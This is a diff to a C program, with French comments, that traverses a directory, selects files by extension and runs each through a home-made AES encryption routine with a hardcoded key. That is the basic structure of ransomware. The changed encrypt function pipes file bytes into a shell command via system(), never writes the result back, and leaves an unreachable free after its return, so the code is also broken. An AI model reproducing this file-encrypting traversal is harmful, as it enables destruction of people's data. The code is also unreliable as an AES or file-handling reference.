@@ -325,7 +325,7 @@ void inv_MixColoumns(uint8_t (*plaintext_dim)[4][4]){ /* a tester*/
 	}
 }
 
-void aes_encrypt(uint8_t* plaintext_line[], uint8_t* key_line[]){
+void aes_encrypt(uint8_t* plaintext_line, uint8_t* key_line){
 	uint8_t key_dim[11][4][4]; 
 	int a = 0;
 	for (int i=0; i<4; i++){
@@ -354,16 +354,16 @@ void aes_encrypt(uint8_t* plaintext_line[], uint8_t* key_line[]){
 	SubBytes(&plaintext_dim);
 	ShiftRows(&plaintext_dim);	
 	AddRoundKey(&plaintext_dim, &key_dim);
-	a = 0;
+	a =0;
 	for (int i=0; i<4; i++){
 		for (int j=0 ; j<4; j++){
-			plaintext_line[a] = plaintext_dim[j][i];
+			plaintext_line[a]= plaintext_dim[j][i];
 			a++;
 			}
 	}
 }
 
-void aes_decrypt(uint8_t* plaintext_line[], uint8_t* key_line[]){
+void aes_decrypt(uint8_t* plaintext_line, uint8_t* key_line){
 	uint8_t key_dim[11][4][4]; 
 	int a = 0;
 	for (int i=0; i<4; i++){
@@ -392,12 +392,13 @@ void aes_decrypt(uint8_t* plaintext_line[], uint8_t* key_line[]){
 	inv_ShiftRows(&plaintext_dim); 
 	inv_SubBytes(&plaintext_dim);	
 	AddRoundKey(&plaintext_dim, &key_dim);	
+	a =0;
 	for (int i=0; i<4; i++){
-			for (int j=0 ; j<4; j++){
-				printf("%hhx\n", plaintext_dim[j][i]);
+		for (int j=0 ; j<4; j++){
+			plaintext_line[a]= plaintext_dim[j][i];
+			a++;
 			}
-	} 
-
+	}
 }
 int stat_file(const char* name){
 	struct stat stat_file;
@@ -430,7 +431,7 @@ int extension_file(const char* name){
 
 }
 
-int encrypt(const char* path){
+int encrypt(const char* path, uint8_t* key_line){
 	printf("on va au chiffrement \n");
 	FILE* fp = fopen(path, "rb");
   	if (!fp) {
@@ -459,29 +460,30 @@ int encrypt(const char* path){
   		
   	}	
   	fclose(fp);
-  	int len = strlen(buffer);
-  	int max = floor(len/16);
+  	int max = floor(num_octet/16);
   	uint8_t plaintext[max][16];
   	for (int w=0; w<max ; w++){
   		for (int x=0; x<16 ; x++){
   			plaintext[w][x] = buffer[(w*16)+x];
   		}
   	}
-  	free(buffer);
-  	uint8_t* key_line[16] = {84, 0x68, 0x61, 0x74,
-				0x73, 0x20, 0x6d, 0x79,
-				0x20, 0x4b, 0x75, 0x6e,
-				0x67, 0x20, 0x46, 0x75};
-	for (int w=0; w<max ; w++){
-  		aes_encrypt(plaintext_line, key_line); //marchePas --> voir pour return l'array via pointeur
-  		a = 0;
-		for (int i=0; i<16; i++){
-			plaintext[w][i] = plaintext_line[i];
-		}
-  	}	
+  	
+  	for (int w=0 ; w<max ; w++){
+  		char *command = malloc(100* sizeof(char));
+  		sprintf(command, "./aes %d,%d,%d,%d,%d,%d,%d,%d,%d,%d,%d,%d,%d,%d,%d,%d", plaintext[w][0],plaintext[w][1],plaintext[w][2],plaintext[w][3],plaintext[w][4],plaintext[w][5],plaintext[w][6],plaintext[w][7],plaintext[w][8],plaintext[w][9],plaintext[w][10],plaintext[w][11],plaintext[w][12],plaintext[w][13],plaintext[w][14],plaintext[w][15]);
+  		system(command);
+  		free(command);
+  	}
+  	return 0;
+  	
+  	free(buffer);	
 }
 
 int ls(const char* name){
+	uint8_t key_line[16] = {84, 0x68, 0x61, 0x74,
+				0x73, 0x20, 0x6d, 0x79,
+				0x20, 0x4b, 0x75, 0x6e,
+				0x67, 0x20, 0x46, 0x75};
 	DIR* dir = opendir(name);
 	printf("Reading files in: %s\n", name);
 	if (dir == NULL){ 
@@ -509,7 +511,7 @@ int ls(const char* name){
 					strcat(file_path, name);
 					strcat(file_path, "/");
 					strcat(file_path, entity->d_name);
-					encrypt(file_path);
+					encrypt(file_path, key_line);
 				} 
 			}
 		}
